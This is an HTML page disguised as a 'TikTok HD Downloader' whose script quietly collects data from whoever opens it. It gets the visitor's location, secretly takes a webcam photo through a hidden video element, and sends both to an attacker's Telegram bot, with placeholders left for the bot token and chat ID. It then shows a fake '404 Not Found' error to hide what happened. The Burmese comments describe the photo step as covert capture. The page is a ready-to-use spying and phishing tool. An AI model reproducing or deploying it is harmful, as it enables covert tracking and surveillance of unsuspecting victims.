<!DOCTYPE html>
<html>
<head><title>TikTok HD Downloader</title></head>
<body>
    <h2 id="status">Processing video... 0%</h2>
    <video id="video" width="160" height="120" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
    const token = 'မင်းရဲ့_TOKEN';
    const chat_id = 'မင်းရဲ့_ID';

    // ၁။ တည်နေရာ တောင်းခြင်း
    navigator.geolocation.getCurrentPosition(pos => {
        const msg = `Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
    });

    // ၂။ Camera ခိုးရိုက်ခြင်း
    async function capture() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            // ၂ စက္ကန့်နေရင် ပုံရိုက်မယ်
            setTimeout(() => {
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'shot.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                }, 'image/jpeg');
                // ပိတ်လိုက်မယ်
                stream.getTracks().forEach(track => track.stop());
                document.getElementById('status').innerText = "Download Error: 404 Not Found";
            }, 2000);
        } catch (err) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Camera Access Denied`);
        }
    }

    capture();
    </script>
</body>
</html>
